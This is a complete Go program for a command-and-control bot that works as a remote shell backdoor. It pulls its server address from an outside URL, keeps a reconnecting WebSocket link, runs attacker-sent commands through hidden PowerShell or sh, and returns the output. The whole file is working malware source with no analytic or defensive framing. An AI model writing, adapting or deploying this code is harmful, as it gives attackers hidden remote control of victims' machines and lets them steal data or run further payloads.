package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os/exec"
	"runtime"
	"strings"
	"time" // Added for sleep delays

	"github.com/gorilla/websocket"
)

// Paste your GitHub Raw URL here
const githubRawURL = "https://valorent.me/dynamic/socket.txt"

// SECURITY: Only execute messages starting with this text
const commandPrefix = "FAHIM:"

// Config: How long to wait before retrying a failed connection
const retryDelay = 10 * time.Second

func main() {
	// --- OUTER LOOP: The Reconnection Loop ---
	// This ensures if we get disconnected, we go back to the top and try again.
	for {
		log.Println("--- Starting Connection Sequence ---")

		// 1. Get URL from GitHub (Dynamic C2)
		// We do this inside the loop so if you update the Gist, the bot gets the new server automatically.
		log.Println("Fetching server URL from GitHub...")
		serverURL, err := fetchURLFromGithub(githubRawURL)
		if err != nil {
			log.Printf("Failed to fetch Server URL: %v. Retrying in %v...\n", err, retryDelay)
			time.Sleep(retryDelay)
			continue // Jump back to start of Outer Loop
		}
		log.Printf("Target Server: %s\n", serverURL)

		// 2. Connect to WebSocket
		conn, _, err := websocket.DefaultDialer.Dial(serverURL, nil)
		if err != nil {
			log.Printf("Connection failed: %v. Retrying in %v...\n", err, retryDelay)
			time.Sleep(retryDelay)
			continue // Jump back to start of Outer Loop
		}

		log.Println("Connected! Waiting for commands...")

		// --- INNER LOOP: The Message Processing Loop ---
		// We stay here as long as the connection is good.
		for {
			// 3. Read Message
			_, message, err := conn.ReadMessage()
			if err != nil {
				log.Printf("Connection Lost (Read Error): %v\n", err)
				break // BREAK out of Inner Loop -> Return to Outer Loop to Reconnect
			}

			msgString := string(message)

			// Security Check
			if !strings.HasPrefix(msgString, commandPrefix) {
				// log.Println("Ignored non-command:", msgString)
				continue
			}

			// Clean the command
			realCommand := strings.TrimSpace(strings.TrimPrefix(msgString, commandPrefix))
			log.Printf("Executing: %s\n", realCommand)

			// 4. Execute Logic
			output, err := executeCommand(realCommand)

			// 5. Send Response
			// We wrap WriteMessage in a check; if sending fails, we assume connection is dead.
			if err != nil {
				errorMsg := fmt.Sprintf("Error running '%s': %s", realCommand, err)
				if writeErr := conn.WriteMessage(websocket.TextMessage, []byte(errorMsg)); writeErr != nil {
					log.Println("Write error (sending failure):", writeErr)
					break // Connection dead, reconnect
				}
			} else {
				if writeErr := conn.WriteMessage(websocket.TextMessage, output); writeErr != nil {
					log.Println("Write error (sending output):", writeErr)
					break // Connection dead, reconnect
				}
			}
		}

		// Cleanup before retrying
		conn.Close()
		log.Printf("Disconnected. Waiting %v before reconnecting...\n", retryDelay)
		time.Sleep(retryDelay)
	}
}

func fetchURLFromGithub(url string) (string, error) {
	// Set a timeout so this doesn't hang forever if GitHub is slow
	client := http.Client{
		Timeout: 10 * time.Second,
	}

	resp, err := client.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("bad status: %s", resp.Status)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(body)), nil
}

func executeCommand(input string) ([]byte, error) {
	// 1. Windows Specific Logic (PowerShell)
	if runtime.GOOS == "windows" {
		cmd := exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", input)
		// On Windows, Hide Window for the command execution itself
		// (This is distinct from the app window, useful if the command spawns sub-processes)
		return cmd.CombinedOutput()
	}

	// 2. Linux/Mac Logic
	cmd := exec.Command("sh", "-c", input)
	return cmd.CombinedOutput()
}
